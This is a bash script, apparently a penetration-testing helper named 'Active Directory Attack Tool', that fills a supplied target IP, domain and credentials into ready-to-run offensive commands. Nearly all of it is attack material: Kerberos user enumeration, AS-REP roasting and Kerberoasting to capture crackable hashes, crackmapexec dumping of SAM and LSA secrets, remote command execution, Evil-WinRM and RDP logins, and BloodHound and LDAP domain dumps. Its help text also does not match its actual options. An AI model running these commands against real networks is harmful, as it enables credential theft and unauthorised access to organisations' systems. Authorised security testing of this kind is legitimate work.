#!/bin/bash

set -e
set -u
set -o pipefail

################################################################################
# Variables                                                                    #
################################################################################

Username="";	#
NQUsername="";	#
Password="";	#
Domain="";	#
NQDomain="";	#
IP="";		#
NQIP="";	#
LDAP="";	#
DC="";		#
NS="IP";	#
GC="";		#


# Wordlists
UserList="'/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'"

################################################################################
# Options                                                                      #
################################################################################

while [ $# -gt 0 ]; do
        key="$1"

        case "${key}" in
              
        -i | --ip)
                IP="'$2'";
                NQIP="$2";
                shift
                shift
                ;;
                
        -u | --username)
                Username="'$2'";
                NQUsername="$2";
                shift
                shift
                ;;
                
        -p | --password)
                Password="'$2'";
                shift
                shift
                ;;    

        -h | --help)
                Help;
                shift
                shift
                ;;
                
        -d | --domain)
                Domain="'$2'";
                NQDomain="$2";
                shift
                shift
                ;;                                                                                           
                
        *)
                POSITIONAL="${POSITIONAL} $1"
                shift
                ;;
        esac
done

###############################################################################
# Help                                                                         #
################################################################################

Help()
{
   # Display Help
   echo "Add description of the script functions here."
   echo
   echo "Syntax: scriptTemplate [-g|h|v|V]"
   echo "options:"
   echo "n     Displays commands for when credentials are not known."
   echo "c     Displays many crackmapexec commands."
   echo "i     Sets the target IP address."
   echo "h     Print this Help."
   echo "v     Verbose mode."
   echo "V     Print software version and exit."
   echo
}

################################################################################
# Colors                                                                    #
################################################################################

RESTORE='\033[0m'

RED='\033[00;31m'
GREEN='\033[00;32m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
PURPLE='\033[00;35m'
CYAN='\033[00;36m'
LIGHTGRAY='\033[00;37m'

LRED='\033[01;31m'
LGREEN='\033[01;32m'
LYELLOW='\033[01;33m'
LBLUE='\033[01;34m'
LPURPLE='\033[01;35m'
LCYAN='\033[01;36m'
WHITE='\033[01;37m'

IBLUE='\033[02;34m'
ICYAN='\033[02;36m'

################################################################################
# Banner                                                                     #
################################################################################

echo 'CSAgICBfICAgIF9fX18gICAgXyAgX19fX18gCgkgICAvIFwgIHwgIF8gXCAgLyBcfF8gICBffAoJICAvIF8gXCB8IHwgfCB8LyBfIFwgfCB8ICAKCSAvIF9fXyBcfCB8X3wgLyBfX18gXHwgfCAgCgkvXy8gICBcX1xfX19fL18vICAgXF9cX3w=' | base64 -d
echo -e ""
echo -e ""
echo -e "	${LGREEN}Active Directory Attack Tool v0.1${RESTORE}"
echo -e  "	${LGREEN}Author:	ViperOne${RESTORE}"

echo -e ""
echo -e ""

################################################################################
# Links                                                                     #
################################################################################

echo -e "\e[1;31mhttps://github.com/The-Viper-One/ActiveDirectoryAttackTool \e[0m"
echo -e "\e[1;31mhttps://viperone.gitbook.io/pentest-everything/ \e[0m"
echo -e ""

echo -e ""
echo -e ""

################################################################################
# Main                                                                     #
################################################################################

echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""


# DNS
echo -e "${LGREEN}DNS${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap --script dns-brute --script-args dns-brute.threads=12 $Domain $IP"
echo -e "nmap -n --script ""\"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"\"" $IP"
echo -e ""
echo -e "${IBLUE}DNSenum${RESTORE}"
echo -e "dnsenum --dnsserver $IP --enum $Domain"
echo -e ""
echo -e "${IBLUE}Dig${RESTORE}"
echo -e "dig AXFR $Domain @$IP"
echo -e ""
echo -e "${IBLUE}Fierce${RESTORE}"
echo -e "fierce -dns $Domain"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# Kerberos
echo -e "${LGREEN}Kerberos${RESTORE}"
echo -e ""
echo -e "${IBLUE}Impacket${RESTORE}"
echo -e "GetNPUsers.py $Domain/ -usersfile $UserList -dc-ip $IP -format 'hashcat'"
echo -n -e "GetNPUsers.py $Domain/$Username:$Password -request -dc-ip $IP -format 'hashcat'" ;echo -e " ${YELLOW}# Requires valid credentials${RESTORE}"
echo -e ""
echo -e "${IBLUE}Kerbrute${RESTORE}"
echo -e "kerbrute userenum $UserList --dc $IP --domain $Domain"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=$Domain,userdb=$UserList $IP"
echo -e ""
echo -e "${IBLUE}Metasploit${RESTORE}"
echo -e "msfconsole -q -x 'use auxiliary/gather/kerberos_enumusers; set rhost $IP; set lport 4444; set DOMAIN $Domain; set USER_FILE $UserList; exploit'"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# NTP
echo -e "${LGREEN}NTP${RESTORE}"
echo -e ""
echo -e "${IBLUE}NTPdate${RESTORE}"
echo -e "sudo ntpdate $IP"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "sudo nmap -sU -p 123 --script ntp-info $IP"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# SMB
echo -e "${LGREEN}SMB${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -p 139,445 $IP"
echo -e ""
echo -e "${IBLUE}nmblookup${RESTORE}"
echo -e "nmblookup -A $IP"
echo -e ""
echo -e "${IBLUE}enum4linux${RESTORE}"
echo -e "enum4linux -u $Username -p $Password -r $IP| grep 'Local User'"
echo -e ""
echo -e "${IBLUE}SMBmap${RESTORE}"
echo -e "smbmap -H $IP -u $Username -p $Password"
echo -e ""
echo -e "${IBLUE}SMBclient${RESTORE}"
echo -e "smbclient -U $Username -P $Password -L \\\\\\\\\\\\\\\\$NQIP"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password"
echo -e "crackmapexec smb $IP -u $Username -p $Password --rid-brute"
echo -e "crackmapexec smb $IP -u $Username -p $Password --lsa"
echo -e "crackmapexec smb $IP -u $Username -p $Password --sam"
echo -e "crackmapexec smb $IP -u $Username -p $Password --pass-pol"
echo -e "crackmapexec smb $IP -u $Username -p $Password --local-groups"
echo -e "crackmapexec smb $IP -u $Username -p $Password --groups"
echo -e "crackmapexec smb $IP -u $Username -p $Password --users"
echo -e "crackmapexec smb $IP -u $Username -p $Password --sessions"
echo -e "crackmapexec smb $IP -u $Username -p $Password --disks"
echo -e "crackmapexec smb $IP -u $Username -p $Password --loggedon-users"
echo -e "crackmapexec smb $IP -u $Username -p $Password --loggedon-users --sessions --users --groups --local-groups --pass-pol --sam --rid-brute 2000"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -X whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -x whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# LDAP
echo -e "${LGREEN}LDAP${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap -n -sV --script "\"ldap* and not brute"\" $IP"
echo -e ""
echo -e "${IBLUE}LDAPdomaindump${RESTORE}"
echo -e "ldapdomaindump -u $NQDomain\\\\\\\\$NQUsername -p $Password ldap://$NQIP"
echo -e ""
echo -e "${IBLUE}LDAPsearch${RESTORE}"
echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP""
echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP" | grep userPrincipalName | sed 's/userPrincipalName: //'"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# WinRM
echo -e "${LGREEN}WinRM${RESTORE}"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec winrm $IP -u $Username -p $Password"
echo -e ""
echo -e "${IBLUE}Evil-WinRM${RESTORE}"
echo -e "evil-winrm -i $IP -u $Username -p $Password"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# BloodHound
echo -e "${LRED}BloodHound${RESTORE}"
echo -e "${RED}https://github.com/fox-it/BloodHound.py${RESTORE}"
echo -e ""
echo -e "python2 bloodhound.py -u $Username -p $Password -ns $IP -d $Domain"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# Impacket
echo -e "${LGREEN}Impacket${RESTORE}"
echo -e ""
echo -e "${IBLUE}GetADUsers${RESTORE}"
echo -e "GetADUsers.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
echo -e ""
echo -e "${IBLUE}GetNPUsers${RESTORE}"
echo -e "GetNPUsers.py $Domain -usersfile $UserList -dc-ip $IP -format 'hashcat'"
echo -n -e "GetNPUsers.py $NQDomain/$NQUsername:$Password -request -dc-ip $IP -format 'hashcat'" ;echo -e " ${YELLOW}# Requires valid credentials${RESTORE}"
echo -e ""
echo -e "${IBLUE}GetUserSPNs${RESTORE}"
echo -n -e "GetUserSPNs.py $NQDomain/$NQUsername:$Password -dc-ip $IP" ;echo -e " ${YELLOW}# Requires valid credentials${RESTORE}"
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""
echo -e ""

# RDP
echo -e "${LGREEN}RDP${RESTORE}"
echo -e ""
echo -e "${IBLUE}xFreeRDP${RESTORE}"
echo -e "xfreerdp /v:$IP /u:$Username /p:$Password"
echo -e "xfreerdp /v:$IP /u:$Username /p:$Password +clipboard"
echo -e "xfreerdp /v:$IP /u:$Username /p:$Password +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

################################################################################
# End	                                                                       #
################################################################################
